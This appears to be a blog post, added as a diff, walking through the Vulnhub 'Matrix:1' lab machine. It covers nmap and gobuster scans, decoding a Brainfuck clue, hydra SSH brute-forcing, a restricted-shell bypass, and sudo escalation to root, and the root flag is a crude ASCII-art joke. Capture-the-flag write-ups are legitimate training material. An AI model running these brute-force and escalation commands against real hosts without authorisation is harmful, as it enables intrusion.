@@ -1,0 +1,160 @@
+---
+layout: post
+title:  "Matrix:1 Vulnhub Walkthrough"
+date:   2020-09-24 15:00:00 +0530
+categories: VulnHub CTF
+---
+Matrix:1 is a machine in which I used Enumeration to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.
+
+## Scanning
+As always, I started scanning with Nmap
+
+```
+root@kali:/home/kali# nmap -sC -sV 192.168.198.139
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 00:30 EDT
+Nmap scan report for 192.168.198.139
+Host is up (0.000096s latency).
+Not shown: 997 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 9c:8b:c7:7b:48:db:db:0c:4b:68:69:80:7b:12:4e:49 (RSA)
+|   256 49:6c:23:38:fb:79:cb:e0:b3:fe:b2:f4:32:a2:70:8e (ECDSA)
+|_  256 53:27:6f:04:ed:d1:e7:81:fb:00:98:54:e6:00:84:4a (ED25519)
+80/tcp    open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
+|_http-server-header: SimpleHTTP/0.6 Python/2.7.14
+|_http-title: Welcome in Matrix
+31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
+|_http-title: Welcome in Matrix
+MAC Address: 00:0C:29:43:C6:92 (VMware)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.96 seconds
+```
+Interesting two http services!
+## Web Enumeration
+Then I enumerated directories and files using gobuster on both services but there is no useful information
+
+```
+root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 192.168.198.139 -x php,html,json,py,matrix
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.198.139
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     matrix,php,html,json,py
+[+] Timeout:        10s
+===============================================================
+2020/09/25 00:50:40 Starting gobuster
+===============================================================
+/index.html (Status: 200)
+/assets (Status: 301)
+/80.py (Status: 200)
+[ERROR] 2020/09/25 00:51:41 [!] Get http://192.168.198.139/page22.php: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)                                                     
+[ERROR] 2020/09/25 00:59:13 [!] Get http://192.168.198.139/35921.php: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)                                                      
+[ERROR] 2020/09/25 01:00:48 [!] Get http://192.168.198.139/helpweb.html: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)                                                   
+[ERROR] 2020/09/25 01:02:08 [!] Get http://192.168.198.139/151871_1: net/http: request canceled (Client.Timeout exceeded while awaiting headers)                                                                                    
+[ERROR] 2020/09/25 01:02:09 [!] Get http://192.168.198.139/lang_ko.py: net/http: request canceled (Client.Timeout exceeded while awaiting headers)                                                                                  
+[ERROR] 2020/09/25 01:02:09 [!] Get http://192.168.198.139/28672.json: net/http: request canceled (Client.Timeout exceeded while awaiting headers)                                                                                  
+[ERROR] 2020/09/25 01:02:09 [!] Get http://192.168.198.139/inalambrico.py: net/http: request canceled (Client.Timeout exceeded while awaiting headers)                                                                              
+[ERROR] 2020/09/25 01:07:53 [!] Get http://192.168.198.139/gisabm.php: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)                                                     
+===============================================================
+2020/09/25 01:14:21 Finished                                                                                      
+===============================================================
+
+```
+Nothing really important here.
+## Inspecting Element
+So, I started digging in the http services in port 80 and 3117. I found a base64 encoded text while inspecting element on port 31337.
+
+![Username](/assets/machines/vulnhub/matrix/1.png)
+
+## Cracking
+
+After decoding
+
+![Username](/assets/machines/vulnhub/matrix/2.png)
+
+so I visted http://192.168.198.139:1337/Cypher.matrix , a filed was downloaded which contained this strange ciphertext
+
+![Username](/assets/machines/vulnhub/matrix/3.png)
+
+I used online crypto Identifier and the text was identified as Brainfuck Endcoding
+
+![Username](/assets/machines/vulnhub/matrix/4.png)
+
+So I used another online tool to decode the text
+
+![Username](/assets/machines/vulnhub/matrix/5.png)
+
+The text contains our password with missing two letters so I used an online combination
+maker and prefix adder to make my wordlist
+![Username](/assets/machines/vulnhub/matrix/6.png)
+
+Then I used hydra to bruteforce the ssh password
+
+```
+hydra -f -l guest -P Downloads/output.txt ssh://192.168.198.139
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-25 01:13:47
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1296 login tries (l:1/p:1296), ~81 tries per task
+[DATA] attacking ssh://192.168.198.139:22/
+
+[STATUS] 178.00 tries/min, 178 tries in 00:01h, 1120 to do in 00:07h, 16 active
+[STATUS] 166.00 tries/min, 498 tries in 00:03h, 800 to do in 00:05h, 16 active
+[STATUS] 153.29 tries/min, 1073 tries in 00:07h, 225 to do in 00:02h, 16 active
+[22][ssh] host: 192.168.198.139   login: guest   password: k1ll0r7n
+[STATUS] attack finished for 192.168.198.139 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-25 01:21:21
+```
+
+## Privilege Escalation
+When I sshed to the user guest, it gave me a restricted shell so I bypassed the restriction by using this command
+
+```
+root@kali:/home/kali# ssh guest@192.168.198.139 -t bash
+
+```
+
+I ran diffreent Enumeration scripts and found an intersting sudo privilege which allows us to run all commands
+
+```
+guest@porteus:/tmp$ sudo -l
+User guest may run the following commands on porteus:
+    (ALL) ALL
+    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
+    (trinity) NOPASSWD: /bin/cp
+
+```
+
+So
+
+```
+guest@porteus:/tmp$ sudo su
+Password: 
+root@porteus:/tmp# cat /root/flag.txt 
+   _,-.                                                             
+,-'  _|                  EVER REWIND OVER AND OVER AGAIN THROUGH THE
+|_,-O__`-._              INITIAL AGENT SMITH/NEO INTERROGATION SCENE
+|`-._\`.__ `_.           IN THE MATRIX AND BEAT OFF                 
+|`-._`-.\,-'_|  _,-'.                                               
+     `-.|.-' | |`.-'|_     WHAT                                     
+        |      |_|,-'_`.                                            
+              |-._,-'  |     NO, ME NEITHER                         
+         jrei | |    _,'                                            
+              '-|_,-'          IT'S JUST A HYPOTHETICAL QUESTION    
+
+```
+and voila here is the root privilege!
+
+
+
+
+
